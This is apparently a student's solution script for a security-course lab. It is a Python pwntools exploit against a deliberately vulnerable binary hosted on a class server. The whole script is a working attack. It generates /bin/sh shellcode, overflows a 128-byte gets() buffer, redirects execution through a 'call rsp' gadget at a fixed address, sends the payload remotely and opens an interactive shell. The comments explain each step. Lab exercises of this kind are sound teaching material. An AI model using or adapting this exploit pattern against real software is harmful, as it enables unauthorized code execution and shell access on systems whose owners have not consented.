from pwn import *

if __name__ == "__main__":

    # Declaring some variables that will be used later.
    local_binary_file = "./lab2-2.bin"
    remote_server = "csc748.hostbin.org"
    remote_port = 7023

    #### PREPARATION ####

    # I start by preparing some shellcode.
    # I use the pwntools built-in shellcraft function to generate some for me.
    context.arch = "amd64"
    shellcode = asm(shellcraft.amd64.linux.sh())


    # To solve this challenge, I start by looking at the lab2-2.c file.
    # The "void nothing_to_see_here()" function must be where the exploit is.
    # In "int main()", the gets instruction is used with a 128-byte buffer.
    # This is where I will push the shellcode onto the stack.

    # I take a look at the binary using ropper.
    # At 0x401259, there are the right bytes to "call rsp".
    # objdump confirms this address is within the "nothing_to_see_here" function.
    # Specifically, the hex is 0xd4ff.
    # I add this address as a variable for later use.

    call_rsp_address = 0x401259

    # Now that I have the place to inject code, 

    #### EXPLOITATION ####
    
    # I can now run the process. The following lines are various forms for different purposes.
    process_to_exploit = remote(remote_server, remote_port)
    # process_to_exploit = process(local_binary_file)
    # process_to_exploit = gdb.debug(local_binary_file)

    # To overflow the buffer, I prepare to send 128+8 bytes.
    buffer_overflower = b"0"*136

    # I also prepare to put the address of the "call rsp" instruction on the stack.
    instruction_redirect = p64(call_rsp_address)

    # Now I send the full attack to the process.
    # This causes the process to overflow the buffer, jump to "call rsp", and execute the shellcode.
    process_to_exploit.sendline(buffer_overflower + instruction_redirect + shellcode)

    # Now I can drop into a shell.
    process_to_exploit.interactive()